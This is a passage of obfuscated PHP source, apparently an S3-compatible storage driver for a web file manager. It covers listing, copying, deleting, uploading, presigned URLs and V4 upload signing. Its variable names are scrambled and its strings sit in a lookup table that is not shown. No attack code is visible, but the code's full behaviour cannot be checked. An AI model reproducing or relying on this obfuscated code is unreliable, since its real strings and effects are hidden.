if (isset($this->{$… ŞûØ})) { $this->{$… ŞûØ} = $È‘‚Ø„…; } } $this->endpoint = $¡—úØ•[$’ñìŠŞ¤[216]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $€êŒ‡¤İ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($€êŒ‡¤İ, 0, 7) == $’ñìŠŞ¤[217]) { $€êŒ‡¤İ = $’ñìŠŞ¤[218] . substr($€êŒ‡¤İ, 7); } $this->client->setEndpoint($€êŒ‡¤İ); if (in_array(ACTION, array($’ñìŠŞ¤[211], $’ñìŠŞ¤[212]))) { $this->client->setExceptions(); } } public function setSignVersion($ÖÎ«÷ñ = "\x76\x34") { $this->signVer = $ÖÎ«÷ñ; $this->client->setSignVersion($ÖÎ«÷ñ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ãéğÄÀò) { return null; } } public function isBucketCors() { $§Ø÷µ =& $_SERVER[¿ÈˆÑ¸ä]; $åÃÓÒ­£ = $this->getBucketCors(); if (!$åÃÓÒ­£ || !is_array($åÃÓÒ­£)) { return !1; } if (!is_array($åÃÓÒ­£[$§Ø÷µ[219]])) { $åÃÓÒ­£[$§Ø÷µ[219]] = explode($§Ø÷µ[50], $åÃÓÒ­£[$§Ø÷µ[219]]); } if ($åÃÓÒ­£[$§Ø÷µ[220]] != $§Ø÷µ[221] || !in_array($§Ø÷µ[221], $åÃÓÒ­£[$§Ø÷µ[219]])) { return !1; } $æÒ¼“ˆÈ = array_map($§Ø÷µ[222], $åÃÓÒ­£[$§Ø÷µ[223]]); if (!is_array($æÒ¼“ˆÈ)) { $æÒ¼“ˆÈ = array(); } $ö¤¨è­‘ = array($§Ø÷µ[224], $§Ø÷µ[225], $§Ø÷µ[226], $§Ø÷µ[227], $§Ø÷µ[228]); $¹Å‡´áÛ = array_diff($ö¤¨è­‘, $æÒ¼“ˆÈ); return empty($¹Å‡´áÛ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($À‘Êšå, $ÆÍ¬Úƒï = '', $¯»’è´Ã = REPEAT_RENAME) { $Ô¹ëïİÉ = $this->setContent($À‘Êšå, $ÆÍ¬Úƒï); if ($Ô¹ëïİÉ !== !1) { return $this->getPathOuter($À‘Êšå); } return !1; } public function mkdir($…¸âÚ£, $¨¬‘É½¾ = REPEAT_SKIP) { $—°²¥ûÅ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($…¸âÚ£) && $…¸âÚ£ !== $—°²¥ûÅ[229]) { return !1; } if ($¨¬‘É½¾ && $this->_isFolder($…¸âÚ£)) { return $this->getPathOuter($…¸âÚ£); } $¨Øªàß = $this->setContent($…¸âÚ£, $—°²¥ûÅ[12], !0); if ($¨Øªàß !== !1) { return $this->getPathOuter($…¸âÚ£); } return !1; } public function copyFile($ıó‡…¡Ô, $¤˜ç„±”, $ÉÀ·ÒÙÍ = array()) { $ÕÇÑÂ Ü =& $_SERVER[¿ÈˆÑ¸ä]; $¸Í¤®¿ = $this->objectMeta($ıó‡…¡Ô); if (!$¸Í¤®¿) { return !1; } if ($¸Í¤®¿[$ÕÇÑÂ Ü[79]] <= 1024 * 1024 * 200) { $«Ú‡÷º‘ = $this->client->copyObject($this->bucket, $ıó‡…¡Ô, $this->bucket, $¤˜ç„±”, $ÕÇÑÂ Ü[230], $ÉÀ·ÒÙÍ); } else { $«Ú‡÷º‘ = $this->client->multiCopyObject($this->bucket, $ıó‡…¡Ô, $this->bucket, $¤˜ç„±”, $ÉÀ·ÒÙÍ); } $«Ú‡÷º‘ = $«Ú‡÷º‘ ? $this->getPathOuter($¤˜ç„±”) : !1; return $«Ú‡÷º‘; } public function moveFile($¼šÍî€à, $²…îå„±) { if ($this->copyFile($¼šÍî€à, $²…îå„±)) { $this->delFile($¼šÍî€à); return $this->getPathOuter($²…îå„±); } return !1; } public function delFile($­Í¶) { return $this->client->deleteObject($this->bucket, $­Í¶); } public function delFolder($••ØÉÑ) { $Ã¬”­È– =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->exist($••ØÉÑ)) { return !0; } $this->listItemCache = !1; $‡ÆéÜ²Ÿ = $this->fileList($••ØÉÑ); $this->listItemCache = !0; $“¶×Úëã = trim($••ØÉÑ, $Ã¬”­È–[8]) . $Ã¬”­È–[8]; if (!empty($••ØÉÑ) && $••ØÉÑ !== $Ã¬”­È–[229] && !in_array($“¶×Úëã, $‡ÆéÜ²Ÿ[$Ã¬”­È–[85]])) { $‡ÆéÜ²Ÿ[$Ã¬”­È–[85]][] = $“¶×Úëã; } $ë¦Ç½˜€ = $this->delByBatch($‡ÆéÜ²Ÿ[$Ã¬”­È–[86]]); if (!$ë¦Ç½˜€) { return !1; } $ë¦Ç½˜€ = $this->delByBatch($‡ÆéÜ²Ÿ[$Ã¬”­È–[85]]); if (!$ë¦Ç½˜€) { return !1; } return $this->delFile($“¶×Úëã); } private function delByBatch($×¯™Ò“Î) { foreach (array_chunk($×¯™Ò“Î, 1000) as $®¦çŠã) { $ªï…‡î = $this->client->deleteObjects($this->bucket, $®¦çŠã); if (!$ªï…‡î) { return !1; } } return !0; } public function rename($È°¼À¥», $õ¥‹ôâ) { return $this->renameObject($È°¼À¥», $õ¥‹ôâ); } public function listPath($ˆû…«š£, $÷åÀˆº = false) { $§Ÿ©á©É =& $_SERVER[¿ÈˆÑ¸ä]; $úÄ•¯£¯ = $this->fileList($ˆû…«š£, $§Ÿ©á©É[8], !0); foreach ($úÄ•¯£¯[$§Ÿ©á©É[85]] as $ôä¿Ç½Ç => $ëæñÊ²’) { $úÄ•¯£¯[$§Ÿ©á©É[85]][$ôä¿Ç½Ç] = $this->folderInfo($ëæñÊ²’, $÷åÀˆº, $ëæñÊ²’); } foreach ($úÄ•¯£¯[$§Ÿ©á©É[86]] as $ôä¿Ç½Ç => $ëæñÊ²’) { $úÄ•¯£¯[$§Ÿ©á©É[86]][$ôä¿Ç½Ç] = $this->fileInfo($ëæñÊ²’[$§Ÿ©á©É[32]], $÷åÀˆº, $ëæñÊ²’); } return $úÄ•¯£¯; } protected function infoChildren($óø£‘·¢, &$ªì¥Ÿ×í) { $İÛ¢¡ÂÇ =& $_SERVER[¿ÈˆÑ¸ä]; $øèÑÇß¯ = $this->fileList($óø£‘·¢, $İÛ¢¡ÂÇ[12], !0); $ªì¥Ÿ×í[$İÛ¢¡ÂÇ[81]] += count($øèÑÇß¯[$İÛ¢¡ÂÇ[85]]); $ªì¥Ÿ×í[$İÛ¢¡ÂÇ[80]] += count($øèÑÇß¯[$İÛ¢¡ÂÇ[86]]); foreach ($øèÑÇß¯[$İÛ¢¡ÂÇ[86]] as $ÓÎÓÄŠ) { if (!$ÓÎÓÄŠ || !$ÓÎÓÄŠ[$İÛ¢¡ÂÇ[79]]) { continue; } $ªì¥Ÿ×í[$İÛ¢¡ÂÇ[79]] += $ÓÎÓÄŠ[$İÛ¢¡ÂÇ[79]]; } } private function fileInfo($ˆªûóô, $˜ˆì¿¾« = false, $Î˜ì‹Ñë = array()) { $”¸å×Ô” =& $_SERVER[¿ÈˆÑ¸ä]; $÷„«Ù³ô = array($”¸å×Ô”[32] => $this->pathThis($ˆªûóô), $”¸å×Ô”[87] => $this->getPathOuter($ˆªûóô), $”¸å×Ô”[33] => $”¸å×Ô”[231], $”¸å×Ô”[167] => $this->ext($ˆªûóô), $”¸å×Ô”[79] => isset($Î˜ì‹Ñë[$”¸å×Ô”[79]]) ? $Î˜ì‹Ñë[$”¸å×Ô”[79]] : 0); if ($˜ˆì¿¾«) { return $÷„«Ù³ô; } $÷„«Ù³ô[$”¸å×Ô”[232]] = $÷„«Ù³ô[$”¸å×Ô”[88]] = 0; $÷„«Ù³ô[$”¸å×Ô”[233]] = $÷„«Ù³ô[$”¸å×Ô”[234]] = !0; if (empty($Î˜ì‹Ñë)) { $Î˜ì‹Ñë = $this->objectMeta($ˆªûóô); if (!$Î˜ì‹Ñë) { return $÷„«Ù³ô; } } if (isset($Î˜ì‹Ñë[$”¸å×Ô”[235]]) && $Î˜ì‹Ñë[$”¸å×Ô”[235]]) { $÷„«Ù³ô[$”¸å×Ô”[236]] = $Î˜ì‹Ñë[$”¸å×Ô”[235]]; } if (isset($Î˜ì‹Ñë[$”¸å×Ô”[205]])) { $÷„«Ù³ô[$”¸å×Ô”[88]] = $Î˜ì‹Ñë[$”¸å×Ô”[205]]; } if (isset($Î˜ì‹Ñë[$”¸å×Ô”[79]])) { $÷„«Ù³ô[$”¸å×Ô”[79]] = $Î˜ì‹Ñë[$”¸å×Ô”[79]]; } return $÷„«Ù³ô; } private function folderInfo($¡å’ôú¸, $‰®şî¥¤ = false, $Å ¿„™Ç = array()) { $ºÈ•ğ°à =& $_SERVER[¿ÈˆÑ¸ä]; $Öš¤¢­ø = array($ºÈ•ğ°à[32] => $this->pathThis($¡å’ôú¸), $ºÈ•ğ°à[87] => $this->getPathOuter($ºÈ•ğ°à[8] . $¡å’ôú¸), $ºÈ•ğ°à[33] => $ºÈ•ğ°à[78]); if ($‰®şî¥¤) { return $Öš¤¢­ø; } $Öš¤¢­ø[$ºÈ•ğ°à[232]] = $Öš¤¢­ø[$ºÈ•ğ°à[88]] = 0; $Öš¤¢­ø[$ºÈ•ğ°à[233]] = $Öš¤¢­ø[$ºÈ•ğ°à[234]] = !0; if ($¡å’ôú¸ == $ºÈ•ğ°à[12]) { return $Öš¤¢­ø; } if (empty($Å ¿„™Ç)) { $Å ¿„™Ç = $this->objectMeta(trim($¡å’ôú¸, $ºÈ•ğ°à[8]) . $ºÈ•ğ°à[8]); } if (isset($Å ¿„™Ç[$ºÈ•ğ°à[205]])) { $Öš¤¢­ø[$ºÈ•ğ°à[232]] = $Å ¿„™Ç[$ºÈ•ğ°à[205]]; } return $Öš¤¢­ø; } private function fileList($ÀÑîñô¤, $‰¢Ø¢ªû = '', $½şŞ®ó = 0) { $°æ¹üïˆ =& $_SERVER[¿ÈˆÑ¸ä]; $Ì…¥Š¥ß = rtrim($ÀÑîñô¤, $°æ¹üïˆ[8]) . $°æ¹üïˆ[8]; $Ä‡Úç‰ƒ = $this->listObjs($Ì…¥Š¥ß, null, null, $‰¢Ø¢ªû); if (!$Ä‡Úç‰ƒ) { return array($°æ¹üïˆ[85] => array(), $°æ¹üïˆ[86] => array()); } $¶„¤ˆÕ‚ = $çáéĞ°Á = array(); foreach ($Ä‡Úç‰ƒ[$°æ¹üïˆ[237]] as $€Ñõ§§) { $£ŒÆÏÖ = $€Ñõ§§[$°æ¹üïˆ[32]]; if ($£ŒÆÏÖ == $Ì…¥Š¥ß) { continue; } $×üªåä = isset($€Ñõ§§[$°æ¹üïˆ[79]]) ? $€Ñõ§§[$°æ¹üïˆ[79]] : 0; $íâÒ¹¢ = $×üªåä == 0 && substr($£ŒÆÏÖ, strlen($£ŒÆÏÖ) - 1, 1) == $°æ¹üïˆ[8] ? !0 : !1; $this->cacheMethodInfoSet($£ŒÆÏÖ, $íâÒ¹¢, $€Ñõ§§); if ($íâÒ¹¢) { $¶„¤ˆÕ‚[] = $£ŒÆÏÖ; continue; } $çáéĞ°Á[] = $½şŞ®ó ? $€Ñõ§§ : $£ŒÆÏÖ; } foreach ($Ä‡Úç‰ƒ[$°æ¹üïˆ[238]] as $€Ñõ§§) { $¶„¤ˆÕ‚[] = $€Ñõ§§[$°æ¹üïˆ[32]]; $this->cacheMethodInfoSet($€Ñõ§§[$°æ¹üïˆ[32]], !0); } $this->cacheMethodInfoSet($ÀÑîñô¤, !0); return array($°æ¹üïˆ[85] => $¶„¤ˆÕ‚, $°æ¹üïˆ[86] => $çáéĞ°Á); } private function listObjs($ƒˆìÂ«, $ÏÙ³ĞÔŠ = null, $íô§ú›µ = null, $œ¦şÑ­ì = null) { $˜öÉß•¯ =& $_SERVER[¿ÈˆÑ¸ä]; $ƒˆìÂ« = trim($ƒˆìÂ«, $˜öÉß•¯[8]); $Ò»ò¨ú† = empty($ƒˆìÂ«) && $ƒˆìÂ« !== $˜öÉß•¯[229] ? $˜öÉß•¯[12] : $ƒˆìÂ« . $˜öÉß•¯[8]; return $this->client->getBucket($this->bucket, $Ò»ò¨ú†, $ÏÙ³ĞÔŠ, $íô§ú›µ, $œ¦şÑ­ì, !0); } public function has($ÛÊÕîŠÎ, $¥Ï¼°¥Ê = false, $‡ä÷ñœĞ = true) { $¼¹¡Óš˜ =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÊÕîŠÎ = trim($ÛÊÕîŠÎ, $¼¹¡Óš˜[8]); $›„Á·½’ = empty($ÛÊÕîŠÎ) && $ÛÊÕîŠÎ !== $¼¹¡Óš˜[229] ? $¼¹¡Óš˜[12] : $ÛÊÕîŠÎ . $¼¹¡Óš˜[8]; $şÛÉØ¨ = null; $œïğÜÉÓ = 500; $Æ©©ÒÁ = $¼¹¡Óš˜[8]; $ßé¡¦ = $…«Ë­½á = array(); while (!0) { $ò¸ÛĞÌú = $this->listObjs($ÛÊÕîŠÎ, $şÛÉØ¨, $œïğÜÉÓ, $Æ©©ÒÁ); if (!$ò¸ÛĞÌú) { break; } $şÛÉØ¨ = $ò¸ÛĞÌú[$¼¹¡Óš˜[239]]; $·ßÖ¸¸ = $ò¸ÛĞÌú[$¼¹¡Óš˜[237]]; $Â­¬¢ Ç = $ò¸ÛĞÌú[$¼¹¡Óš˜[238]]; if (empty($·ßÖ¸¸) && empty($Â­¬¢ Ç)) { break; } if (count($·ßÖ¸¸) == 1 && $·ßÖ¸¸[0][$¼¹¡Óš˜[32]] == $›„Á·½’) { break; } if ($¥Ï¼°¥Ê) { if (count($·ßÖ¸¸)) { $·ßÖ¸¸ = array_column($·ßÖ¸¸, $¼¹¡Óš˜[32]); $ßé¡¦ = array_merge($ßé¡¦, $·ßÖ¸¸); } if (count($Â­¬¢ Ç)) { $Â­¬¢ Ç = array_column($Â­¬¢ Ç, $¼¹¡Óš˜[32]); $…«Ë­½á = array_merge($…«Ë­½á, $Â­¬¢ Ç); } if ($şÛÉØ¨ === null) { break; } continue; } if ($‡ä÷ñœĞ) { if (!empty($·ßÖ¸¸)) { if (count($·ßÖ¸¸) > 1 || isset($·ßÖ¸¸[0][$¼¹¡Óš˜[32]]) && $·ßÖ¸¸[0][$¼¹¡Óš˜[32]] != $›„Á·½’) { return !0; } } } else { if (!empty($Â­¬¢ Ç)) { return !0; } } if ($şÛÉØ¨ === null) { break; } } if ($¥Ï¼°¥Ê) { $ßé¡¦ = array_diff($ßé¡¦, array($›„Á·½’)); $ßé¡¦ = count(array_unique($ßé¡¦)); $…«Ë­½á = count(array_unique($…«Ë­½á)); return array($¼¹¡Óš˜[240] => $ßé¡¦, $¼¹¡Óš˜[241] => $…«Ë­½á); } return !1; } public function listAll($è‹¹²ßı) { $¾¥‚üšË =& $_SERVER[¿ÈˆÑ¸ä]; $ÓÕÑ×µš = $this->fileList($è‹¹²ßı, $¾¥‚üšË[12], !0); $¥èƒè¦Á = array_to_keyvalue($ÓÕÑ×µš[$¾¥‚üšË[86]], $¾¥‚üšË[32]); foreach ($ÓÕÑ×µš[$¾¥‚üšË[85]] as $‡Üæ¸Çó) { if (is_string($‡Üæ¸Çó)) { $¥èƒè¦Á[$‡Üæ¸Çó] = array($¾¥‚üšË[79] => 0); } } return $this->listAllFiles($è‹¹²ßı, $¥èƒè¦Á); } public function canRead($Á¹®×ù¶) { $¸ßŞÊĞ =& $_SERVER[¿ÈˆÑ¸ä]; $àİØÛüÙ = $this->client->getAccessControlPolicy($this->bucket, $Á¹®×ù¶); if (!$àİØÛüÙ) { return !1; } return in_array($àİØÛüÙ, array($¸ßŞÊĞ[242], $¸ßŞÊĞ[243], $¸ßŞÊĞ[244])) ? !0 : !1; } public function canWrite($âÉÜë†) { $¡ØËŠ§Î =& $_SERVER[¿ÈˆÑ¸ä]; $§Æ§åÄ§ = $this->client->getAccessControlPolicy($this->bucket, $âÉÜë†); if (!$§Æ§åÄ§) { return !1; } return in_array($§Æ§åÄ§, array($¡ØËŠ§Î[242], $¡ØËŠ§Î[243])) ? !0 : !1; } public function getContent($åÄÊ£„) { return $this->client->getObject($this->bucket, $åÄÊ£„); } public function setContent($Éôç, $ÌŞÑ¡ø = '', $Æäìş¸ = false) { $õŠ¹ÍÁÚ =& $_SERVER[¿ÈˆÑ¸ä]; $Éôç = $Æäìş¸ ? trim($Éôç, $õŠ¹ÍÁÚ[8]) . $õŠ¹ÍÁÚ[8] : $Éôç; $ıä¯ãÔ  = get_file_mime(get_path_ext($Éôç)); $¸è±ƒöá = $this->client->putObject($ÌŞÑ¡ø, $this->bucket, $Éôç, $õŠ¹ÍÁÚ[230], array(), $ıä¯ãÔ ); if (!$¸è±ƒöá) { return !1; } if ($Æäìş¸) { return !0; } return $¸è±ƒöá ? !0 : !1; } public function fileSubstr($Ä¡ŞûÖÑ, $ö•¯ÚËâ, $úËÑü½) { $Úæ¢ó = $ö•¯ÚËâ + $úËÑü½ - 1; return $this->client->getObject($this->bucket, $Ä¡ŞûÖÑ, array($_SERVER[¿ÈˆÑ¸ä][245] => "\x62\x79\x74\x65\x73\x3d{$ö•¯ÚËâ}\x2d{$Úæ¢ó}")); } public function upload($ÈÊƒ€³Ä, $À…ôø§¿, $—é­˜Í” = false, $”¸ıÊç» = REPEAT_REPLACE) { $ĞÊğµ„ =& $_SERVER[¿ÈˆÑ¸ä]; $£ÛŒ³ô¯ = array($ĞÊğµ„[246] => @md5_file($À…ôø§¿)); $“ù•Î”Ø = array($ĞÊğµ„[247] => get_file_mime(get_path_ext($ÈÊƒ€³Ä))); if (IO::size($À…ôø§¿) <= 1024 * 1024 * 200) { $ç‚øğÎê = $this->client->putObjectFile($À…ôø§¿, $this->bucket, $ÈÊƒ€³Ä, $ĞÊğµ„[230], $£ÛŒ³ô¯, $“ù•Î”Ø); return !empty($ç‚øğÎê) ? $this->getPathOuter($ÈÊƒ€³Ä) : !1; } $¨ÌßÉı = $this->client->multiUploadObject($À…ôø§¿, $this->bucket, trim($ÈÊƒ€³Ä, $ĞÊğµ„[8]), $£ÛŒ³ô¯, $“ù•Î”Ø); return $¨ÌßÉı ? $this->getPathOuter($ÈÊƒ€³Ä) : !1; } public function download($ÖŸãõç‚, $Ùá¼¦´Ÿ) { if (!@is_dir($this->pathFather($Ùá¼¦´Ÿ)) && !IO::mkdir($this->pathFather($Ùá¼¦´Ÿ))) { return !1; } $ıˆæŸ©ì = $this->client->getObject($this->bucket, $ÖŸãõç‚, array(), $Ùá¼¦´Ÿ); return $ıˆæŸ©ì !== !1 ? $Ùá¼¦´Ÿ : !1; } public function link($ìùËÌ™, $½àéÒ¼Ë = array()) { return $this->getPreSignedURL($ìùËÌ™, 3600 * 12, $½àéÒ¼Ë); } private function getPreSignedURL($ø€ÃÀ¯“, $–°¶˜³ª, $ÈÔ¼˜Ï = array(), $ÔÖ¹Ù‘Ù = "\x47\105\x54") { $’µ‰£˜à =& $_SERVER[¿ÈˆÑ¸ä]; $ø€ÃÀ¯“ = trim($ø€ÃÀ¯“, $’µ‰£˜à[8]); if ($this->signVer == $’µ‰£˜à[248]) { return $this->client->getPreSignedV2URL($this->bucket, $ø€ÃÀ¯“, $–°¶˜³ª, $ÔÖ¹Ù‘Ù, $ÈÔ¼˜Ï); } return $this->client->getPreSignedV4URL($this->bucket, $ø€ÃÀ¯“, $–°¶˜³ª, array(), $ÔÖ¹Ù‘Ù, $ÈÔ¼˜Ï); } public function fileOut($ÚÃº¡˜Ì, $³àÃî‹¾ = false, $ŠÒ˜´æ = false, $®ıÍÑéÌ = '') { $Ï‡Şºöö =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÚÃº¡˜Ì, $³àÃî‹¾, $ŠÒ˜´æ, $®ıÍÑéÌ); } if (!$ŠÒ˜´æ) { $ŠÒ˜´æ = $this->pathThis($ÚÃº¡˜Ì); } $Æ„öÆÀñ = get_file_mime(get_path_ext($ŠÒ˜´æ)); if ($Æ„öÆÀñ == $Ï‡Şºöö[249]) { return parent::fileOut($ÚÃº¡˜Ì, $³àÃî‹¾, $ŠÒ˜´æ, $®ıÍÑéÌ); } $±ÍšŸ†‡ = array($Ï‡Şºöö[250] => $Æ„öÆÀñ); if ($³àÃî‹¾) { $±ÍšŸ†‡[$Ï‡Şºöö[251]] = $Ï‡Şºöö[252] . rawurlencode($ŠÒ˜´æ); } else { } $¯‡ûÃÌÜ = $this->link($ÚÃº¡˜Ì, $±ÍšŸ†‡); $this->fileOutLink($¯‡ûÃÌÜ); } public function fileOutServer($éÍ±•ÓÃ, $ÊìÄ¶¨ = false, $á÷“»­Ú = false, $®£—ø£‘ = '') { parent::fileOut($éÍ±•ÓÃ, $ÊìÄ¶¨, $á÷“»­Ú, $®£—ø£‘); } public function fileOutImageServer($ÁÊ¬¨º¿, $Ï‹Áè¸² = 250) { parent::fileOutImage($ÁÊ¬¨º¿, $Ï‹Áè¸²); } public function fileOutLink($‚ áğ©û) { $ÓÙÔ”¶‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÓÙÔ”¶‡[67], $ÓÙÔ”¶‡[66], $ÓÙÔ”¶‡[68])) && !get_url_scheme($this->endpoint) && substr($‚ áğ©û, 0, 7) == $ÓÙÔ”¶‡[217]) { $‚ áğ©û = $ÓÙÔ”¶‡[218] . substr($‚ áğ©û, 7); } header($ÓÙÔ”¶‡[173] . $‚ áğ©û); die; } public function hashMd5($Òßèã¿Ç, $“ÂÆÙŞ = '') { $÷ ©ˆ¶ = $this->objectMeta($Òßèã¿Ç); if (!$÷ ©ˆ¶) { return !1; } $“ÂÆÙŞ = $“ÂÆÙŞ ? $“ÂÆÙŞ : _get($÷ ©ˆ¶, $_SERVER[¿ÈˆÑ¸ä][253]); return $“ÂÆÙŞ; } public function uploadFormData($°áºÜ¨, $íˆ…»µö = 3600) { $„ô‰èô™ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->_isClientAsync()) { $‹£…ğåÄ = $this->getPreSignedURL($°áºÜ¨, $íˆ…»µö, array(), $„ô‰èô™[254]); return array($„ô‰èô™[207] => str_replace($„ô‰èô™[217], $„ô‰èô™[255], $‹£…ğåÄ)); } if (isset($GLOBALS[$„ô‰èô™[6]][$„ô‰èô™[92]][$„ô‰èô™[256]]) && $GLOBALS[$„ô‰èô™[6]][$„ô‰èô™[92]][$„ô‰èô™[256]] == $„ô‰èô™[229]) { return $this->uploadMultiData($°áºÜ¨, $íˆ…»µö); } if ($this->signVer == $„ô‰èô™[248]) { return $this->uploadFormDataV2($°áºÜ¨, $íˆ…»µö); } return $this->uploadFormDataV4($°áºÜ¨, $íˆ…»µö); } public function uploadFormDataV2($¼ƒÁúú„, $ÈÚËçûá = 3600) { $—ìâ‚è‘ =& $_SERVER[¿ÈˆÑ¸ä]; $²×Ñ‡¥ı = $this->pathFather($¼ƒÁúú„); $Ã«ò›¢º = $this->client->getHttpUploadPostParams($this->bucket, $²×Ñ‡¥ı, $—ìâ‚è‘[230], $ÈÚËçûá); $ÆÖÉê = array_merge((array) $Ã«ò›¢º, array($—ìâ‚è‘[257] => $—ìâ‚è‘[248], $—ìâ‚è‘[207] => $this->getHost())); if ($this->_isClientAsync()) { unset($ÆÖÉê[$—ìâ‚è‘[257]]); } return $ÆÖÉê; } public function uploadFormDataV4($ŒÛÛûÙø, $íÓˆ®Ïß = 3600) { $ÕÖìÀèİ =& $_SERVER[¿ÈˆÑ¸ä]; $Ş¾Ú™š´ = $ÕÖìÀèİ[230]; $§¨ò—ÆÛ = $ÕÖìÀèİ[258]; $Ú­ää¶² = $ÕÖìÀèİ[62]; $Ë§äÉÅ­ = gmdate($ÕÖìÀèİ[259]); $¹éıù´¥ = gmdate($ÕÖìÀèİ[260]); $Óè°Ä¹È = $ÕÖìÀèİ[261]; $ÀóõÁ¨¬ = $íÓˆ®Ïß . $ÕÖìÀèİ[12]; $µ”«ò = $ÕÖìÀèİ[262]; $Š±¶´”· = array($this->accessKey, $¹éıù´¥, $this->region, $Ú­ää¶², $Óè°Ä¹È); $³³¬«Şò = implode($ÕÖìÀèİ[8], $Š±¶´”·); $†˜—á×Õ = array($ÕÖìÀèİ[263] => gmdate($ÕÖìÀèİ[264], strtotime($ÕÖìÀèİ[265])), $ÕÖìÀèİ[266] => array(array($ÕÖìÀèİ[267] => $this->bucket), array($ÕÖìÀèİ[268], $ÕÖìÀèİ[269], $ÕÖìÀèİ[12]), array($ÕÖìÀèİ[268], $ÕÖìÀèİ[270], $ÕÖìÀèİ[12]), array($ÕÖìÀèİ[271] => $µ”«ò), array($ÕÖìÀèİ[272] => $³³¬«Şò), array($ÕÖìÀèİ[273] => $§¨ò—ÆÛ), array($ÕÖìÀèİ[274] => $Ë§äÉÅ­), array($ÕÖìÀèİ[275] => $ÀóõÁ¨¬))); $Üœª­ = base64_encode(json_encode($†˜—á×Õ)); $é§§Æ© = hash_hmac($ÕÖìÀèİ[276], $¹éıù´¥, $ÕÖìÀèİ[277] . $this->secret, !0); $ïıôÉêÎ = hash_hmac($ÕÖìÀèİ[276], $this->region, $é§§Æ©, !0); $÷İ±¢‡Î = hash_hmac($ÕÖìÀèİ[276], $Ú­ää¶², $ïıôÉêÎ, !0); $Œ¥ƒ™…‰ = hash_hmac($ÕÖìÀèİ[276], $Óè°Ä¹È, $÷İ±¢‡Î, !0); $ÑÈŒóì´ = hash_hmac($ÕÖìÀèİ[276], $Üœª­, $Œ¥ƒ™…‰); $§ª˜Ö„” = array($ÕÖìÀèİ[247] => $ÕÖìÀèİ[12], $ÕÖìÀèİ[271] => $µ”«ò, $ÕÖìÀèİ[278] => $Üœª­, $ÕÖìÀèİ[272] => $³³¬«Şò, $ÕÖìÀèİ[273] => $§¨ò—ÆÛ, $ÕÖìÀèİ[274] => $Ë§äÉÅ­, $ÕÖìÀèİ[275] => $ÀóõÁ¨¬, $ÕÖìÀèİ[279] => $ÑÈŒóì´, $ÕÖìÀèİ[257] => $ÕÖìÀèİ[248], $ÕÖìÀèİ[207] => $this->getHost()); if ($this->_isClientAsync()) { unset($§ª˜Ö„”[$ÕÖìÀèİ[257]]); } return $§ª˜Ö„”; } public function uploadMultiData($—Î¯Ùå, $ºá¸Ò¼ = 3600) { $¾„ÙàÙ =& $_SERVER[¿ÈˆÑ¸ä]; $ñ—–öìÒ = $this->signVer == $¾„ÙàÙ[248] ? gmdate($¾„ÙàÙ[280]) : gmdate($¾„ÙàÙ[281]); $ÌÚ‹Ç¢ = array(); $Š¤˜ÜÈ = $this->client->getUploadId($this->bucket, $—Î¯Ùå, $ÌÚ‹Ç¢); if (!$Š¤˜ÜÈ) { return !1; } $æ×÷Æòâ = array($¾„ÙàÙ[282] => $Š¤˜ÜÈ, $¾„ÙàÙ[207] => $this->getHost() . $¾„ÙàÙ[8] . $this->pathEncode($—Î¯Ùå), $¾„ÙàÙ[283] => $ñ—–öìÒ, $¾„ÙàÙ[95] => $—Î¯Ùå, $¾„ÙàÙ[257] => $this->signVer); if ($this->_isClientAsync()) { unset($æ×÷Æòâ[$¾„ÙàÙ[257]]); } return $æ×÷Æòâ; } public function uploadMultiAuth($Óªèó, $¹‚¡´•Ó = array()) { $âÂ”ü‚¸ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->signVer == $âÂ”ü‚¸[248]) { if (isset($¹‚¡´•Ó[$âÂ”ü‚¸[284]])) { return $this->uploadPartAuthV2($Óªèó, $¹‚¡´•Ó); } return $this->uploadListAuthV2($Óªèó, $¹‚¡´•Ó); } if (isset($¹‚¡´•Ó[$âÂ”ü‚¸[284]])) { return $this->uploadPartAuthV4($Óªèó, $¹‚¡´•Ó); } return $this->uploadListAuthV4($Óªèó, $¹‚¡´•Ó); } public function uploadPartAuthV2($ƒ²µ²ŒÉ, $ºšµ½Ö = array()) { $‹Õı³Ë‘ =& $_SERVER[¿ÈˆÑ¸ä]; $µôŠÎ¹Ú = $ºšµ½Ö[$‹Õı³Ë‘[95]]; $ı·Ù¨Ù‚ = gmdate($‹Õı³Ë‘[280]); $îµ‚÷Ä = array_intersect_key($ºšµ½Ö, array_flip(array($‹Õı³Ë‘[284], $‹Õı³Ë‘[282]))); ksort($îµ‚÷Ä); $Ù—İ¼§Ò = $îµ‚÷Ä ? $‹Õı³Ë‘[76] . http_build_query($îµ‚÷Ä, null, $‹Õı³Ë‘[285], PHP_QUERY_RFC3986) : $‹Õı³Ë‘[12]; $ò‘ñç¹± = array($‹Õı³Ë‘[254], $‹Õı³Ë‘[12], $‹Õı³Ë‘[121], $‹Õı³Ë‘[12], "\x78\55\141\x6d\172\x2d\x64\141\164\x65\x3a{$ı·Ù¨Ù‚}", $‹Õı³Ë‘[8] . $this->bucket . $‹Õı³Ë‘[8] . $this->pathEncode($µôŠÎ¹Ú) . $Ù—İ¼§Ò); $áÃ»·è = implode($‹Õı³Ë‘[286], $ò‘ñç¹±); $š·Ïæä = $this->client->__getSignature($áÃ»·è); return array($‹Õı³Ë‘[287] => $š·Ïæä, $‹Õı³Ë‘[283] => $ı·Ù¨Ù‚); } public function uploadListAuthV2($“ÙıËÏï, $ÍÍ±Îáñ = array()) { $Í¼ëãÄ =& $_SERVER[¿ÈˆÑ¸ä]; $­¬¦‰½Ü = $ÍÍ±Îáñ[$Í¼ëãÄ[95]]; $¼Èñ‰ã® = $ÍÍ±Îáñ[$Í¼ëãÄ[282]]; $•»±¼ë¦ = $this->client->listParts($this->bucket, $­¬¦‰½Ü, $¼Èñ‰ã®); if (!$•»±¼ë¦) { return !1; } $í˜¿‘ñ = 